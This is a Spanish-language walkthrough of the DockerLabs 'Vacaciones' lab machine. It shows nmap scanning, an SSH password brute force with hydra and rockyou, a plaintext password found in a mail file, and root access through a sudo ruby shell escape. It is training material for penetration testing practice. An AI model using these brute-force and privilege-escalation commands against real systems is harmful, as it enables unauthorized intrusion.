#Vacacciones DockerLabs - 14/05/2024

#web - https://dockerlabs.es/#/

Hacemos un escaneo de puertos con nmap:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 22:08 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds

```
Accedemos a la web y vemos una página web en blanco:

![Captura de pantalla 2024-05-14 221852](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/3d24462b-04c5-47ac-a9dd-8fbb2ffad74a)

Nos metemos a ver el codigo y vemos dos posibles usuarios "camilo" y "juan":

![Captura de pantalla 2024-05-14 221917](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/1c1ead82-09cc-430f-8a62-ea8e21e6c9c7)

Creamos un archivo .txt con estos dos usuarios:
(Camilo es el usuario con el que hacer el ataque de fuerza bruta ponerlo el primero para que sea más rápido)

```shell
└─$ nano users.txt
```

![Captura de pantalla 2024-05-14 224207](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/c6797580-33ad-49c4-998a-0ee01d6fea2f)

Procedemos al ataque de fuerza bruta con hydra:

```shell
└─$ hydra -L /home/kali/Desktop/Machines/users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-14 22:35:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-14 22:36:05
```
Accedemos via ssh:

```shell
└─$ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: 
$ 
```

Probamos un sudo -l pero vemos que no funciona:

```shell
$ sudo -l
[sudo] password for camilo: 
Sorry, user camilo may not run sudo on d3c3148a6872.
```

Probamos a buscar binarios con permisos SUID pero no hay nada explotable:

```shell
camilo@d3c3148a6872:~$ find / -perm -4000 -user root 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/bin/mount
/bin/umount
/bin/su

```

Viajamos entre directorios para ver que podemos encontrar vamos hasta "/home" y si hacemos "ls" vemos un direcorio llamado "var" entramos y encontramos otro llamado "mail" dentro hay otro que se llama "camilo"  y dentro encontramos un archivo "mail.txt" hacemos un "cat" y esto es lo que vemos:

```shell
camilo@d3c3148a6872:/var/mail/camilo$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb

```

Ahora accedemos a la maquina con el usuario "root" y la contraseña "2k84dicb":

```shell
└─$ ssh root@172.17.0.2
root@172.17.0.2's password: 
Permission denied, please try again.
```

Lo probamos y vemos que el usuario no es root, ahora lo vamos a probar con el usuario "juan":

```shell
└─$ ssh juan@172.17.0.2
juan@172.17.0.2's password: 
$ 

```

Esta vez si funciona.
Ejecutamos un "sudo -l" para ver si podemos escarlar privilegios desde aqui:

```shell
$ sudo -l
Matching Defaults entries for juan on d3c3148a6872:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on d3c3148a6872:
    (ALL) NOPASSWD: /usr/bin/ruby

```

Vemos que se puede ejecutar el binario "/usr/bin/ruby" sin contraseña:
Entramos a "https://gtfobins.github.io/gtfobins/ruby/" y pegamos el codigo en la terminal:

```shell
$ sudo ruby -e 'exec "/bin/sh"'

```

```shell
# whoami
root
# 
```
